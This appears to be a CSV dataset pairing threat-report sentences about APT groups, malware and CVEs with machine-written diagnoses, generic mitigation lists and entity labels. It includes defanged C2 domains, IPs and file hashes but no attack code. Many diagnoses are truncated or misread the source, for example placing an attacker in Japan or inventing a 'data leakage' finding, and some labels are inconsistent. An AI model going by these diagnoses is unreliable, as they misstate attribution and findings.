id,text,diagnosis,solutions,label_1,label_2,label_3
249,a cybersquatting domain save-russia[.]today is launching dos attacks on ukrainian news sites.,"the diagnosis is a cyber attack that involves the use of a cybersquatting domain save-russia[.]today to launch dos attacks on ukrainian news sites. the attacker targets the ukrainian news sites as the victim, using the cybersquatting",1. implementing dns filtering to block access to known cybersquatting domains 2. conducting regular vulnerability assessments and penetration testing to identify and address potential security weaknesses 3. implementing firewalls and intrusion detection systems to detect and prevent do,attack-pattern,url,attack-pattern
14309,"like the android maikspy, it first sends a notification to its c&c server to register the device.","the diagnosis is that the entity identified as ""software"" is infected with malware labeled as ""malware"". the malware is communicating with an infrastructure entity identified as ""infrastucture"" through a beacon-to relationship.",1. implementing a robust anti-malware software that can detect and remove the malware from the infected system. 2. conducting regular vulnerability assessments and penetration testing to identify and address any security weaknesses that could be exploited by attackers. 3. implement,SOFTWARE,malware,Infrastucture
13996,"while analyzing the technical details of this malware, which includes two new espionage backdoors, we noticed striking similarities to other malware attributed to the threat actor known as apt37, also known as reaper or group 123.","diagnosis: apt37/reaper/group 123 is responsible for the malware attack, which includes two new espionage backdoors. the similarity of the malware to other attributed attacks suggests a pattern of behavior and tactics used by the threat actor.",1. implementing advanced threat detection technologies such as behavior-based detection systems to identify and respond to apt37/reaper/group 123 attacks in real-time. 2. conducting regular security audits and vulnerability assessments to identify and remediate weaknesses in the organization's security posture that could be exploited by apt37/reaper/group 123. 3. implementing multi-factor authentication and access controls to limit the risk of unauthorized access to sensitive data and systems. 4. developing and implementing,threat-actor,threat-actor,threat-actor
13600,"(note that flash has been declared end-of-life by adobe since december 31, 2020.) if the victim downloads and executes the installer downloaded from this page, the victim will be infected with a variant of gh0strat malware, previously also named gh0stcringe or cineregrat.","the diagnosis is a malware infection. the entity affected is the victim who downloads and executes the installer downloaded from a specific page. the relationship between the entities is that the malware variant gh0strat, previously named gh0stcringe or cin",1. implementing a robust antivirus software that can detect and remove malware variants like gh0strat. 2. educating users on safe browsing practices and warning them against downloading/installing software from untrusted sources. 3. conducting regular security audits and vulnerability assessments to identify and address potential weaknesses in the system. 4. implementing network segmentation to limit the spread of malware infections in case of a breach. 5. enforcing strong password policies to prevent unauthorized access to systems and data. 6,TIME,malware,malware
14364,figure 21. connection of maikspy variants to 107[.]180[.]46[.]243 and hxxp://fakeomegle[.]com figure 22. connection of maikspy variants to 198[.]12[.]149[.]13and hxxp://miakhalifagame[.]com/,the diagnosis is that maikspy malware variants are communicating with malicious ip address 107.180.46.243 and fakeomegle[.]com as well as ip address 198.12.149.13 and miakhalifagame,"1. implementing a robust firewall system that can detect and block traffic to/from the malicious ip addresses and domains. 2. deploying an intrusion detection and prevention system (idps) to monitor network traffic and identify any suspicious activity related to the maikspy malware. 3. conducting regular vulnerability assessments and penetration testing to identify and patch any weaknesses in the network infrastructure that could be exploited by the malware. 4. educating employees on the importance of cybersecurity best practices, such as avoiding suspicious links",URL,URL,malware
13565,the source code of this framework is shared across many chinese public forums.,"possible diagnosis: data leakage explanation: the cybersecurity issue identified in the input is the sharing of the source code of a framework on chinese public forums. this can lead to data leakage, as the source code may contain sensitive information about the framework's design","1. implement access controls: restrict access to sensitive information and limit the number of people who have access to it. this can be done by using role-based access control, multi-factor authentication, and encryption. 2. monitor network traffic: use intrusion detection and prevention systems to monitor network traffic and detect any unusual activity. this can help identify any attempts to exfiltrate data. 3. conduct regular security audits: regularly review security policies and procedures to identify and address vulnerabilities. this can help prevent",location,tools,
2400,"the cve-2022-22965 vulnerability allows an attacker unauthenticated remote code execution (rce), which unit 42 has observed being exploited in the wild.","the entity identified by id 45495 is vulnerable to the cve-2022-22965 vulnerability, which has been exploited in the wild by an attacker identified by entity id 45496. the relationship between these entities is that the attacker delivers the","1. patch the vulnerability: the most straightforward solution is to patch the vulnerability that is being exploited. this can be done by applying the latest security updates and patches to the affected systems. 2. implement intrusion detection and prevention systems: intrusion detection and prevention systems can detect and block attacks before they can cause damage. these systems can monitor network traffic and identify suspicious activity, such as attempts to exploit known vulnerabilities. 3. conduct regular vulnerability assessments: regular vulnerability assessments can help identify vulnerabilities before they are exploited",vulnerability,attack-pattern,identity
14126,"at the same time, we were able to locate the mattermost server hosted in greece, and that gave us the current time zone of the mattermost server.","the cybersecurity issue is not specified in the input. however, based on the entities and relationships provided, it appears that the diagnosis is related to the infrastructure of the mattermost server. the mattermost server is hosted in greece and its current time zone has","without a specific cybersecurity issue to address, it is difficult to provide potential solutions. however, some general cybersecurity measures that can help protect the infrastructure of a server include: 1. implementing strong access controls and authentication mechanisms to prevent unauthorized access. 2. regularly updating and patching software and applications to address any known vulnerabilities. 3. monitoring network traffic and activity to detect any suspicious behavior. 4. implementing firewalls and intrusion detection/prevention systems to block malicious traffic. 5. backing up",location,Infrastucture,Infrastucture
1929,"but this link is further fortified by the android applications we found whose code is like that of bahamut, with the c&c matching the usual name registration pattern of patchwork’s group, as well as an infrastructure close to an old patchwork domain.","the diagnosis is that patchwork threat actor group is using bahamut-like malware and android applications to carry out their cyber attacks, as evidenced by the matching c&c registration pattern and infrastructure associated with an old patchwork domain. the malware is attributed to","1. implementing strong network security measures, such as firewalls and intrusion detection/prevention systems, to detect and block any suspicious activity from patchwork threat actors. 2. conducting regular vulnerability assessments and patch management to ensure that all software and systems are up-to-date and secure against known threats. 3. deploying advanced endpoint protection solutions, such as anti-virus and anti-malware software, to detect and remove any bahamut-like malware or malicious android applications. 4. educating",SOFTWARE,threat-actor,threat-actor
1921,"a malicious rtf file that exploits the cve-2017-8750 and drops a malicious vb backdoor with c&c appswonder[.]info a malicious inpage file that exploits cve-2017-12824 and drops two files, one non-malicious, and one malicious vb backdoor with c&c referfile[.]com talos recently reported both c&c domain names with one type of campaign that targets ios and involves mdm, and another type using vb and delphi backdoors.",the diagnosis is a malware infection resulting from the exploitation of two vulnerabilities (cve-2017-8750 and cve-2017-12824). the malware drops a malicious vb backdoor with c&c at appswonder[.]info and refer,"1. patching the vulnerabilities: the first and most important solution is to patch the vulnerabilities (cve-2017-8750 and cve-2017-12824) that the malware is exploiting. this will prevent the malware from gaining access to the system. 2. endpoint protection: deploying endpoint protection software like antivirus, anti-malware, and intrusion prevention systems can help detect and prevent malware infections. these solutions can scan incoming traffic, monitor system behavior, and block malicious activities. 3",vulnerability,url,identity
4577,recently observed coldriver indicators: in another campaign tracked by cert-ua as uac-0056 we observed compromised email addresses of a regional prosecutor’s office of ukraine leveraged to send malicious microsoft excel documents with vba macros delivering cobalt strike.,compromised email addresses of a regional prosecutor’s office of ukraine were leveraged by a threat actor to send malicious microsoft excel documents with vba macros delivering cobalt strike. the threat actor impersonated an identity and duplicated another threat actor. the attack,1. implement multi-factor authentication (mfa) for email accounts to prevent unauthorized access. 2. conduct regular security awareness training for employees to educate them on how to identify and avoid phishing emails. 3. use email filtering solutions to detect and block malicious emails before they reach employees' inboxes. 4. implement endpoint protection solutions that can detect and block cobalt strike and other malware. 5. monitor network traffic for suspicious activity and implement intrusion detection and prevention systems (idps) to alert on potential,tools,identity,threat-actor
5230,we named these malicious apps anubisspy (androidos_anubisspy) as all the malware’s payload is a package called watchdog.,"the diagnosis is a case of malware infection, specifically the anubisspy (androidos_anubisspy) malware, affecting multiple entities identified in the input. the relationship between the entities is that they are all instances of the same malware, with",1. conduct regular and thorough malware scans on all devices and networks to detect and remove any instances of the anubisspy malware. 2. implement strong access controls and authentication measures to prevent unauthorized access to sensitive data and systems. 3. educate employees and users on safe browsing practices and the risks of downloading and installing unknown apps or software. 4. use network segmentation and firewalls to isolate infected devices or networks and prevent the spread of the malware. 5. keep all software and operating systems up,malware,malware,malware
3788,"at the time, we found chessmaster targeting different sectors from the academe to media and government agencies in japan.","diagnosis: a targeted cyber espionage campaign (chessmaster) is being conducted against various sectors including academia, media, and government agencies in japan. the identity of the attacker is unknown. the attacker is located in japan.","1. implement network segmentation to isolate critical systems and data from the rest of the network, limiting the attacker's ability to move laterally. 2. deploy advanced threat detection and response tools to identify and respond to potential threats in real-time. 3. conduct regular vulnerability assessments and penetration testing to identify and remediate vulnerabilities in the network. 4. implement multi-factor authentication for all users to prevent unauthorized access to sensitive systems and data. 5. train employees on cybersecurity best practices and the risks associated with targeted",campaign,identity,location
3833,base64 encoded anel downloaded by koadic anel will send the infected environment’s information to the c&c server.,"the entity has been infected by the anel malware, which is capable of downloading and exfiltrating information to a c&c server. the malware is part of an infrastructure that facilitates the attack.",1. implement strong network segmentation to prevent the spread of the malware to other parts of the network. 2. install and regularly update anti-malware software on all devices to detect and remove the anel malware. 3. deploy a network intrusion detection system (nids) to monitor network traffic and detect any suspicious activity related to the malware. 4. conduct regular security awareness training for employees to prevent them from falling victim to phishing attacks that may lead to the installation of the anel malware. 5,malware,malware,malware
4830,recently observed coldriver indicators: in another campaign tracked by cert-ua as uac-0056 we observed compromised email addresses of a regional prosecutor’s office of ukraine leveraged to send malicious microsoft excel documents with vba macros delivering cobalt strike.,compromised email addresses of a regional prosecutor's office of ukraine were used by a threat actor to deliver malicious microsoft excel documents with vba macros delivering cobalt strike. the threat actor used tools to carry out the attack. the regional prosecutor's office,1. implementing multi-factor authentication (mfa) for email accounts to prevent unauthorized access. 2. conducting regular security awareness training for employees to educate them on phishing attacks and other cybersecurity threats. 3. installing anti-malware software on all devices to detect and prevent malicious software from being installed. 4. regularly monitoring network traffic for suspicious activity and implementing intrusion detection and prevention systems. 5. conducting regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the network. 6,identity,SOFTWARE,tools
4626,"as part of tag's mission to counter serious threats to google and our users, we've analyzed a range of persistent threats including apt35 and charming kitten, an iranian government-backed group that regularly targets high risk users.","diagnosis: apt35 and charming kitten, two threat actors associated with the iranian government, are targeting high risk users of google. the location of the threat actors is identified as iran. the cybersecurity issue is the persistent threat to google and","1. implementing multi-factor authentication for high-risk google users to prevent unauthorized access. 2. conducting regular security assessments and penetration testing to identify and address vulnerabilities in google's systems. 3. deploying intrusion detection and prevention systems to detect and block malicious activity from apt35 and charming kitten. 4. implementing network segmentation to limit the spread of any potential breaches and minimize the impact of a successful attack. 5. educating high-risk google users on best practices for cybersecurity, such",identity,threat-actor,threat-actor
3392,biopass rat loader backdoor.win64.biopass.a 36e3fcd6a4c7c9db985be77ea6394b2ed019332fdae4739df2f96a541ea52617 silverlight.exe,the diagnosis is a cybersecurity threat caused by the biopass rat loader backdoor malware (backdoor.win64.biopass.a) found in the silverlight.exe file. the relationship between the entities indicates that the hash of the malware matches the,"1. install and regularly update antivirus software to detect and remove the biopass rat loader backdoor malware. 2. implement a firewall to monitor and block unauthorized access to the network and prevent the malware from communicating with its command and control (c&c) server. 3. conduct regular vulnerability scans and penetration testing to identify and address any weaknesses in the network that could be exploited by the malware. 4. use application whitelisting to limit the execution of unauthorized software, including the silverlight.exe file",malware,hash,malware
4497,"the actors behind this campaign, which we attributed to a government-backed entity based in north korea, have employed a number of means to target researchers.",diagnosis: state-sponsored cyber espionage entity: government-backed entity based in north korea relationship: attributed-to the campaign targeting researchers,"1. implementing strong network security measures such as firewalls, intrusion detection systems, and data encryption to prevent unauthorized access to sensitive information. 2. conducting regular security audits and vulnerability assessments to identify and address any potential weaknesses in the system. 3. implementing two-factor authentication and other access control measures to ensure that only authorized personnel can access sensitive information. 4. educating employees on cybersecurity best practices and the risks of phishing attacks and social engineering tactics used by state-sponsored entities. 5. collabor",campaign,location,
3748,"cve-2022-22954, a remote code execution (rce) vulnerability due to server-side template injection in vmware workspace one access and identity manager, is trivial to exploit with a single http request to a vulnerable device.",the diagnosis is a critical cybersecurity issue caused by a remote code execution (rce) vulnerability in vmware workspace one access and identity manager (software). this vulnerability (cve-2022-22954) can be easily exploited with a single http request and,1. update to the latest version of the affected software as soon as possible to patch the vulnerability. 2. implement network segmentation to prevent unauthorized access to critical systems and data. 3. use intrusion detection and prevention systems to detect and block any attempts to exploit the vulnerability. 4. implement strong access controls and authentication mechanisms to limit access to sensitive data and systems. 5. conduct regular vulnerability assessments and penetration testing to identify and address any potential security weaknesses. 6. train employees on cybersecurity best practices and encourage,attack-pattern,attack-pattern,vulnerability
3661,"mitre also identifies different main targets for each group: while carbanak focuses on banking institutions, fin7 targets food, hospitality, and retail establishments.","the diagnosis is a targeted cyber attack by two known threat actors, carbanak and fin7, on specific industries - banking institutions and food, hospitality, and retail establishments respectively. the entities involved are mitre, carbanak, fin7,","1. implementing multi-factor authentication for all employees and customers of the targeted industries to prevent unauthorized access to sensitive information. 2. regularly conducting vulnerability assessments and penetration testing to identify and address potential security weaknesses. 3. utilizing advanced threat detection and prevention tools, such as intrusion detection systems and firewalls, to monitor network traffic and block malicious activity. 4. educating employees on cybersecurity best practices, such as avoiding suspicious emails and links, to prevent social engineering attacks. 5. establishing incident",threat-actor,threat-actor,identity
3173,"what makes biopass rat particularly interesting is that it can sniff its victim’s screen by abusing the framework of open broadcaster software (obs) studio, a popular live streaming and video recording app, to establish live streaming to a cloud service via real-time messaging protocol (rtmp).",malware infection (biopass rat) targeting software entities (open broadcaster software studio and real-time messaging protocol) through a targets relationship.,1. install and regularly update anti-malware software to detect and remove biopass rat and other malware infections. 2. implement network segmentation to isolate software entities and prevent the spread of malware infections. 3. conduct regular vulnerability assessments and penetration testing to identify and address potential vulnerabilities in software entities and protocols. 4. implement access controls and authentication mechanisms to restrict access to software entities and prevent unauthorized access. 5. monitor network traffic and behavior for suspicious activity and anomalies using intrusion detection and prevention systems.,malware,SOFTWARE,SOFTWARE
1569,"bad rabbit is a ransomware attack that, at the time of this writing, appears to primarily be affecting countries in eastern europe.",bad rabbit is a malware that targets locations in eastern europe.,1. implement a robust antivirus software that can detect and prevent the bad rabbit malware from infecting the system. 2. educate employees on the dangers of opening suspicious emails or downloading files from untrusted sources. 3. conduct regular security audits to ensure that all systems and software are up-to-date with the latest security patches. 4. use firewalls and intrusion detection systems to monitor network traffic and block any suspicious activity. 5. implement multi-factor authentication to prevent unauthorized access to sensitive data. 6.,malware,location,
3384,biopass rat loader backdoor.win64.biopass.a 3195c355aa564ea66b4b37baa9547cb53dde7cf4ae7010256db92fff0bde873d flash.exe,the diagnosis is that the entity flash.exe has been infected with the biopass rat loader backdoor malware (backdoor.win64.biopass.a) identified by the hash value 3195c355aa564ea66b4b37,"1. use antivirus software to detect and remove the biopass rat loader backdoor malware from the entity flash.exe. 2. implement network segmentation to prevent the spread of the malware to other parts of the network. 3. conduct regular vulnerability assessments to identify and patch vulnerabilities that could be exploited by malware. 4. implement access control measures to restrict access to sensitive data and systems. 5. train employees on cybersecurity best practices, including how to identify and report suspicious activity. 6. use firewalls and",malware,hash,malware
2027,"while the obfuscation and execution may differ between the two, both samples contain very similar core functionality, due to the author copying the leaked babuk/babyk source code in order to develop the helloxd ransomware (figure 7).","the diagnosis is that the entity in the second column is infected with the helloxd ransomware, which is a variant of the babuk/babyk malware. the relationship between the entities in the third column indicates that the helloxd ransomware is a","potential cybersecurity solutions to solve the helloxd ransomware infection include: 1. implementing a robust antivirus and anti-malware solution that can detect and remove the babuk/babyk malware and its variants, including helloxd ransomware. 2. regularly updating software and operating systems to patch any vulnerabilities that can be exploited by ransomware and other types of malware. 3. conducting regular backups of critical data and storing them in a secure offsite location to ensure that data can be restored in",malware,malware,malware
13472,"we continue to see attacks from groups like charming kitten on medical and healthcare professionals, including world health organization (who) employees.","targeted cyber attacks on healthcare professionals, including who employees, by threat actors like charming kitten.",1. implementing multi-factor authentication for all employees accessing sensitive information. 2. regularly updating and patching all software and systems to prevent vulnerabilities. 3. conducting regular cybersecurity training and awareness programs for employees to identify and report suspicious activities. 4. deploying advanced threat detection and response systems to monitor and detect any potential attacks. 5. establishing a robust incident response plan to quickly respond and mitigate any cyber attacks. 6. implementing access controls and permissions to limit access to sensitive information only,threat-actor,identity,
3436,"this post is also available in: 日本語 (japanese) on may 4, 2022, f5 released a security advisory for a remote code execution vulnerability in the icontrolrest component of its big-ip product tracked in cve-2022-1388.","diagnosis: f5's big-ip product has a remote code execution vulnerability in the icontrolrest component, identified as cve-2022-1388. a security advisory was released on may 4, 2022. the relationship between",potential cybersecurity solutions: 1. apply the security patch provided by f5 networks to address the cve-2022-1388 vulnerability in the icontrolrest component of big-ip. 2. monitor network traffic for any suspicious activity related to the vulnerability and promptly investigate any anomalies. 3. implement network segmentation to limit the impact of any potential exploitation of the vulnerability. 4. conduct regular vulnerability assessments and penetration testing to identify and address any potential security weaknesses in the system. 5. educate users,vulnerability,vulnerability,TIME
2597,"this initial focus has led to speculation that lapsus$ group may be brazilian, although we understand the choice of targets to have been influenced by extended team members rather than the team leadership.","the cybersecurity issue is a potential threat actor, identified as lapsus$ group. the entity in question is a location, potentially brazil. the relationship between the two entities is that the threat actor may be based in or have ties to the location.",1. implement a comprehensive threat intelligence program that monitors activity related to lapsus$ group and other known threat actors in brazil. 2. conduct regular vulnerability assessments and penetration testing to identify and address potential weaknesses in the organization's security posture. 3. deploy advanced endpoint protection solutions that can detect and respond to malicious activity in real-time. 4. implement multi-factor authentication and other access controls to prevent unauthorized access to sensitive data and systems. 5. develop and implement an incident response plan that outlines the steps,threat-actor,location,
4585,"in march 2021, microsoft kicked off the patch cycle early after releasing an advisory regarding the mass exploitation of four zero-days vulnerabilities by a chinese hacking group, hafnium, on the on-premises versions of the microsoft exchange server.","diagnosis: the cybersecurity issue is a mass exploitation of four zero-day vulnerabilities in the on-premises versions of the microsoft exchange server. the entity involved is microsoft, and the threat actor is a chinese hacking group named hafnium. the",1. patching and updating the microsoft exchange server to the latest version to mitigate the zero-day vulnerabilities. 2. implementing multi-factor authentication to prevent unauthorized access to the microsoft exchange server. 3. conducting regular vulnerability assessments and penetration testing to identify and address potential security gaps in the system. 4. implementing intrusion detection and prevention systems to detect and block any suspicious activity on the microsoft exchange server. 5. educating employees on cybersecurity best practices to prevent phishing and social engineering attacks that could compromise,TIME,identity,vulnerability
1712,in this case a legitimate service (tor) was being abused by cryptowall so it could avoid having its c2 servers shut down.,"abuse of legitimate service (tor) by cryptowall malware, using tools to avoid detection and control its command and control servers.",1. implement network segmentation to isolate infected systems and prevent lateral movement of the malware. 2. deploy intrusion detection and prevention systems to detect and block traffic associated with the cryptowall malware. 3. implement endpoint protection solutions that can detect and block malicious activity on the infected systems. 4. monitor tor traffic for suspicious activity and block access to known malicious tor exit nodes. 5. implement a threat intelligence program to stay updated on the latest threats and vulnerabilities. 6. conduct regular security awareness training for employees to,malware,tools,
5060,"recently observed coldriver credential phishing domains: ghostwriter, a belarusian threat actor, recently introduced a new capability into their credential phishing campaigns.","diagnosis: ghostwriter, a belarusian threat actor, has introduced a new capability into their credential phishing campaigns, which involves using coldriver phishing domains. the threat actor is located in belarus and is using this campaign for malicious purposes.",1. implementing multi-factor authentication (mfa) for all accounts to prevent unauthorized access even if the credentials are compromised. 2. conducting regular security awareness training for employees to educate them on how to identify and avoid phishing emails. 3. implementing email filters to detect and block suspicious emails and domains. 4. deploying advanced threat intelligence solutions to monitor and detect potential threats in real-time. 5. conducting regular vulnerability assessments and penetration testing to identify and address any security weaknesses in the system,location,campaign,threat-actor
4823,"ghostwriter/unc1151, a threat actor attributed to belarus, has remained active targeting accounts of webmail and social media networks of polish users.","the diagnosis is that ghostwriter/unc1151, a threat actor attributed to belarus, has been actively targeting the accounts of webmail and social media networks of polish users. the relationship between the entities is that ghostwriter/unc1151 is attributed","1. implementing multi-factor authentication for webmail and social media accounts to prevent unauthorized access by threat actors like ghostwriter/unc1151. 2. conducting regular security audits and vulnerability assessments of webmail and social media platforms to identify and address potential security gaps. 3. educating polish users on cybersecurity best practices, such as creating strong passwords, avoiding suspicious links and attachments, and reporting any suspicious activity to the relevant authorities. 4. utilizing advanced threat detection and response technologies to monitor and",threat-actor,threat-actor,location
1819,additional tools and components were copied to the compromised machine using anydeskmsi to scan the local network and disable security products.,"the diagnosis is that the compromised machine was targeted by an attacker who used anydeskmsi to copy additional tools and components to it. the attacker then used these tools to scan the local network and disable security products. this indicates a sophisticated attack, likely",1. implementing network segmentation to limit the attacker's ability to move laterally within the network. 2. enforcing strict access controls to limit the use of remote desktop software like anydeskmsi. 3. deploying endpoint detection and response (edr) solutions to detect and respond to advanced threats. 4. conducting regular vulnerability assessments and penetration testing to identify and remediate vulnerabilities before attackers can exploit them. 5. implementing multi-factor authentication (mfa) to prevent unauthorized access to,tools,attack-pattern,attack-pattern
3400,biopass rat loader backdoor.win64.biopass.a 7f4e02a041ca7cfbdc79b96a890822fd7c37be67b1f6c9e07596e6aec57ccdc0 silverlight.exe,"the diagnosis is that the entity silverlight.exe is infected with the biopass rat loader backdoor malware, identified by the hash 7f4e02a041ca7cfbdc79b96a890822fd7c37be",1. install and regularly update antivirus software to detect and remove the biopass rat loader backdoor malware. 2. implement a firewall to prevent unauthorized access to the system. 3. conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses. 4. educate employees on safe browsing habits and the risks of downloading and opening suspicious files or email attachments. 5. implement access controls and limit user privileges to prevent unauthorized access to sensitive data and systems. 6. use intrusion detection and prevention systems,malware,hash,malware
3719,"in both carbanak and fin7 attacks, communication with users’ compromised systems is done through bypassing firewalls or network detection systems via commonly used ports, using connection proxies to avoid direct connections to the threat group’s infrastructure, employing the command-and-control channel to remotely copy files from an external system, blending in with existing network traffic by using standard application layer protocol, and taking advantage of standard cryptographic protocol to disguise command-and-control traffic.","the entities of the diagnosis are two threat actors (carbanak and fin7) and three attack patterns. the relationship between the entities is that the threat actors use the attack patterns to bypass firewalls and network detection systems, employ the command-and-control",1. implement advanced firewalls and intrusion detection systems that can detect and block the attack patterns used by carbanak and fin7. 2. deploy endpoint security solutions that can detect and prevent command-and-control communications. 3. conduct regular security awareness training for employees to prevent social engineering attacks that may be used by carbanak and fin7. 4. use multi-factor authentication and access controls to prevent unauthorized access to sensitive systems and data. 5. conduct regular vulnerability assessments and penetration testing to identify and,threat-actor,threat-actor,attack-pattern
1708,last year we highlighted two malware families on this blog: cryptowall 2.0 and dyreza/dyre.,"duplicate malware detected between cryptowall 2.0 and dyreza/dyre, indicating a potential security breach and need for increased cybersecurity measures.","1. implementing multi-factor authentication for all user accounts to prevent unauthorized access. 2. conducting regular security audits and vulnerability assessments to identify and address potential security gaps. 3. deploying advanced threat detection and prevention tools such as intrusion detection and prevention systems, firewalls, and antivirus software. 4. providing regular security awareness training to employees to educate them on the importance of cybersecurity and how to identify and report potential threats. 5. enforcing strict access controls and permissions to limit the exposure of sensitive",malware,malware,malware
4587,"the vulnerability has been dubbed as proxylogon by the researchers at devcore, who are credited with finding the bugs in the proxy architecture and the logon mechanism of exchange.","the entity identified as software has a vulnerability labeled as proxylogon. the vulnerability affects the identity entity involved in the logon mechanism of exchange, as indicated by the ""has"" relationship between software and vulnerability, and vulnerability and identity. this suggests a",1. patching and updating the affected software to fix the vulnerability. 2. implementing network segmentation to limit the potential impact of a successful attack. 3. deploying intrusion detection and prevention systems to detect and block any attempts to exploit the vulnerability. 4. conducting regular vulnerability assessments and penetration testing to identify and address any potential vulnerabilities. 5. implementing multi-factor authentication to strengthen the logon mechanism and prevent unauthorized access. 6. educating employees on the importance of cybersecurity and best practices for,SOFTWARE,vulnerability,identity
106,"similarly, darkside operators used mega client for exfiltrating files to cloud storage, 7-zip for archiving, and putty application for network file transfers.","the diagnosis is a cyber attack perpetrated by the darkside threat actor group, who used various tools such as mega client, 7-zip, and putty application for exfiltrating files to cloud storage, archiving, and network file transfers,",1. implement multi-factor authentication (mfa) to prevent unauthorized access to cloud storage and network file transfers. 2. use endpoint detection and response (edr) tools to monitor and detect suspicious activities on endpoints. 3. deploy a next-generation firewall (ngfw) to monitor network traffic and block malicious traffic. 4. conduct regular vulnerability assessments and penetration testing to identify and address security weaknesses. 5. implement data loss prevention (dlp) solutions to prevent sensitive data from being exfiltrated,threat-actor,tools,tools
3410,biopass rat loader backdoor.win64.biopass.a ba44c22a3224c3a201202b69d86df2a78f0cd1d4ac1119eb29cae33f09027a9a silverlight2.exe,"the diagnosis is that a malware called biopass rat loader has been detected in the file silverlight2.exe, identified by the hash ba44c22a3224c3a201202b69d86df2a78f0cd","1. install and regularly update antivirus software to detect and remove malware like biopass rat loader. 2. use a firewall to block unauthorized access to the system and prevent malware from communicating with its command and control server. 3. implement intrusion detection and prevention systems (idps) to detect and prevent malware from entering the system. 4. conduct regular vulnerability assessments and penetration testing to identify and address system vulnerabilities that can be exploited by malware. 5. educate employees on safe browsing habits, email phishing",malware,hash,malware
3390,test4.exe biopass rat loader backdoor.win32.biopass.a 3589e53c59d9807cca709387bbcaaffc7e24e15d9a78425b717fc55c779b928e,"the diagnosis for this cybersecurity issue is that the entity ""test4.exe"" is infected with the backdoor.win32.biopass.a rat loader malware, which is identified by the hash value ""3589e53c59d9807cca","1. quarantine and delete the infected file ""test4.exe"" from the system. 2. use an anti-malware software to scan and remove any other malware that may have infected the system. 3. conduct a thorough system scan to identify any other potential malware or vulnerabilities that may have been exploited by the backdoor.win32.biopass.a rat loader malware. 4. implement strict access controls and user permissions to prevent unauthorized access and execution of malicious files. 5. educate users",malware,hash,FILEPATH
4265,"one file stealer (cca74bb322ad7833a21209b1418c9837e30983daec30d199a839f46075ee72f2, detected as tspy_delf.suw) published by security researchers in 2013 and linked to the domain myflatnet[.]com, was attributed by several parties to the hangover group.","the diagnosis is that the hangover group is attributed to the malware tspy_delf.suw, which communicates with the domain myflatnet[.]com. the malware is a file stealer, identified by its hash cca74bb","1. implementing a robust anti-malware solution that can detect and block tspy_delf.suw and other similar malware from entering the system. 2. blocking access to the malicious domain myflatnet[.]com through firewalls, dns filtering, or other network security measures. 3. conducting regular security audits and vulnerability assessments to identify and address any potential security gaps that could be exploited by malware like tspy_delf.suw. 4. educating employees on",threat-actor,hash,malware
2399,"two days later on march 31, 2022, spring released version 5.3.18 and 5.2.20 of spring framework to patch another more severe vulnerability tracked in cve-2022-22965.","diagnosis: the cybersecurity issue is a vulnerability tracked in cve-2022-22965. the entity affected is the spring framework, which released version 5.3.18 and 5.2.20 to patch the vulnerability. the relationship",1. implementing the latest patch releases from spring framework to address the vulnerability. 2. conducting regular vulnerability assessments and penetration testing to identify and address any potential security gaps. 3. implementing network segmentation and access control measures to limit the impact of a potential breach. 4. implementing multi-factor authentication to prevent unauthorized access to sensitive data. 5. enforcing strong password policies and regular password updates to prevent credential theft.,TIME,SOFTWARE,SOFTWARE
14408,leverage wmi for fileless intrusion execute powershell script for fileless intrusion,"fileless intrusion using wmi and powershell script executed by the attacker using a tool. the tool leverages wmi to execute the powershell script, which allows the attacker to bypass traditional antivirus detection. this type of attack is difficult to detect",1. implement endpoint detection and response (edr) solutions that can detect fileless attacks by monitoring system behavior and identifying anomalous activity. 2. utilize security information and event management (siem) solutions to monitor network traffic and detect suspicious activity that may indicate a fileless attack. 3. implement application whitelisting to prevent unauthorized scripts from executing on endpoints. 4. utilize network segmentation to limit lateral movement of attackers within the network. 5. conduct regular security awareness training for employees to,attack-pattern,tools,
564,"after infection, virlock hides the file extension through modification of the registry (hkcu\software\microsoft\windows\currentversion\explorer\advanced\hidefileext = 1, hkcu\software\microsoft\windows\currentversion\explorer\advanced\hidden = 2).","the entity is a malware and the diagnosis is that it modifies the registry keys (hkcu\software\microsoft\windows\currentversion\explorer\advanced\hidefileext = 1, hkcu\software\microsoft\windows\currentversion",1. implement anti-malware software that can detect and remove the specific malware causing the registry key modification. 2. configure firewalls to block traffic from known malicious ip addresses or domains. 3. implement intrusion detection and prevention systems (idps) to detect and prevent malware from accessing the system. 4. regularly update and patch software to prevent vulnerabilities that can be exploited by malware. 5. educate employees on safe browsing habits and email security to prevent malware from being downloaded onto the system.,REGISTRYKEY,REGISTRYKEY,malware
2313,"the exploit chain combined an rce in webkit exploiting cve-2021-1789 which was patched on jan 5, 2021 before discovery of this campaign and a 0-day local privilege escalation in xnu (cve-2021-30869) patched on sept 23, 2021.",the diagnosis is a successful cyber attack that exploited a vulnerability in webkit (cve-2021-1789) and a local privilege escalation in xnu (cve-2021-30869) on a software entity. the attack occurred between jan,1. patch management: ensure that all software entities are updated with the latest security patches to address known vulnerabilities such as cve-2021-1789 and cve-2021-30869 in webkit and xnu respectively. 2. network segmentation: implement network segmentation to limit the spread of a successful cyber attack to other parts of the network. this can be done by separating critical systems from less critical ones and restricting access to sensitive data. 3. employee training: train employees on cybersecurity best,vulnerability,SOFTWARE,TIME
3370,.python.biopass.a e479823aa41d3f6416233dba8e765cf2abaa38ad18328859a20b88df7f1d88d5 sc2.txt biopass rat encoded cobalt strike shellcode trojan.win32.cobeacon.a e567fd0f08fdafc5a89c9084373f3308ef464918ff7e4ecd7fb3135d777e946d sc3.txt,the diagnosis is that the entity e479823aa41d3f6416233dba8e765cf2abaa38ad18328859a20b88df7f1d88d5 in the file sc2.txt is infected,1. install and regularly update antivirus software to detect and remove malware. 2. use firewalls to prevent unauthorized access to the system and block malicious traffic. 3. implement access controls to limit the number of individuals who can access the infected file. 4. conduct regular system scans to identify any potential threats or vulnerabilities. 5. utilize intrusion detection and prevention systems to detect and block malicious activity. 6. implement security patches and updates to ensure that the system is protected against known vulnerabilities. 7. educ,malware,tools,hash
4459,"in 2017, android – which is owned by google – was the first mobile platform to warn users about nso group’s pegasus spyware.","diagnosis: nso group's pegasus spyware is a malware that threatens android, a software owned by google. the malware was authored by the threat actor identified as nso group.",1. implementing strict access controls and permissions on android devices to prevent unauthorized installation of malware. 2. conducting regular security audits and vulnerability assessments on android devices to detect and mitigate any potential security threats. 3. installing anti-malware software on android devices to detect and remove any malicious software. 4. educating users on safe browsing habits and avoiding downloading apps from untrusted sources. 5. blocking known malicious ip addresses and domains associated with nso group's pegasus spyware using firewalls,malware,TIME,threat-actor
